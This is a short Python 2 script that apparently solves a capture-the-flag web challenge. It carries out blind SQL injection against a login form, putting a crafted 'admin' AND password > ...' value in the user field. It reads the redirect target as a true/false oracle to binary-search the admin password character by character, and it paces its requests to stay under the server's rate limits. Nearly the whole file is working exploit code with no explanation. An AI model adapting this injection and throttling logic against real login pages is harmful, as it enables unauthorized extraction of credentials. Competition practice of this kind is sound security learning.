#!/usr/bin/env python
# coding:utf-8

import requests
import os
import base64
import string
import time


# Init
host = "qu0t45%swww" % base64.b64encode(os.urandom(6 * 16 / 8), "__")
host = host.lower()
print 'host:', host
url = 'http://%s-abuse.web.ctfcompetition.com/login' % host
res = requests.get(url)


start_time = time.time()
hits = [start_time]
errs = []
flag = 'CTF{%s-' % host
# flag = 'CTF{'

def check(x):
    url = 'http://%s-abuse.web.ctfcompetition.com/login' % host
    body = dict(
        user="admin' AND password > '%s" % (flag + x),
        password='',
    )
    print url, body
    res = requests.post(url, data=body, allow_redirects=False)
    location = res.headers.get('Location', '')

    hits.append(time.time())
    if 'password' in location:
        errs.append(time.time())
        return True
    elif 'username' in location:
        return False
    else:
        raise Exception(res.content)

def remove_timeout(arr):
    while len(arr) > 0 and time.time() - arr[0] >= 30.1:
        arr.remove(arr[0])

def remove_all_timeout():
    remove_timeout(hits)
    remove_timeout(errs)


allowed = sorted(string.letters + string.digits + '-_')

for i in xrange(64):
    elapsed = time.time() - start_time
    l = len(flag) - 30
    print 'progress:', elapsed, l, elapsed / (l + 1e-5)
    available = list(allowed)
    while True:
        remove_all_timeout()
        if len(available) == 1:
            flag += available[0]
            break
        if len(hits) < 13 and len(errs) < 2:
            print len(hits), '=>', hits, len(errs), '=>', errs, available
            step = (len(available) - 1) / 8 + 1
            if check(available[-step]):
                available = available[-step:]
            else:
                available = available[:-step]
        else:
            time.sleep(0.1)
